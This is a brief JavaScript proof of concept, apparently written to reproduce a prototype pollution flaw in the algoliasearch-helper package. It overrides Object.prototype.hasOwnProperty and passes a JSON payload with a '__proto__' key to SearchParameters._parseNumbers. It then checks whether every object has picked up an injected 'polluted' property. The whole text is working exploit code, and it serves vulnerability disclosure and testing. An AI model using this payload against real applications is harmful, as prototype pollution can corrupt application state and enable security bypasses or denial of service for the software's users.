Object.prototype.hasOwnProperty = () => true;
const algohelp = require('algoliasearch-helper');
let payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
console.log({}.polluted);
algohelp.SearchParameters._parseNumbers(payload);
console.log({}.polluted);